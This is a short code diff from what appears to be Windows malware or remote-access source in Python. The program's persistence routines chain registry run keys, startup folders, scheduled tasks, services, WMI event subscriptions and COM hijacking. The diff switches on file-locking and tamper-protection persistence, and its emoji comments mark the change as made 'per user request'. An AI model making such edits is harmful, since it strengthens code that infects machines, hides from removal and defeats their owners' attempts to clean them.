@@ -3126,16 +3126,16 @@ def establish_persistence():
     persistence_methods = [
         registry_run_key_persistence,
         startup_folder_persistence,
-        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy
+        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy (watchdog-like)
         scheduled_task_persistence,
         service_persistence,
         # Advanced persistence methods
         system_level_persistence,
         wmi_event_persistence,
         com_hijacking_persistence,
-        # file_locking_persistence,  # DISABLED to prevent repeated restarts/popups
-        # watchdog_persistence,      # DISABLED to prevent repeated restarts/popups
-        # tamper_protection_persistence,  # DISABLED to prevent repeated restarts/popups
+        file_locking_persistence,  # ✅ ENABLED - File locking persistence
+        # watchdog_persistence,      # ❌ DISABLED per user request - prevent repeated restarts/popups
+        tamper_protection_persistence,  # ✅ ENABLED - Tamper protection
     ]
     
     success_count = 0
@@ -3789,9 +3789,9 @@ def setup_advanced_persistence():
             system_level_persistence,
             wmi_event_persistence,
             com_hijacking_persistence,
-            file_locking_persistence,
-            watchdog_persistence,
-            tamper_protection_persistence,
+            file_locking_persistence,  # ✅ ENABLED - File locking persistence
+            # watchdog_persistence,    # ❌ DISABLED per user request
+            tamper_protection_persistence,  # ✅ ENABLED - Tamper protection
         ]
         
         success_count = 0
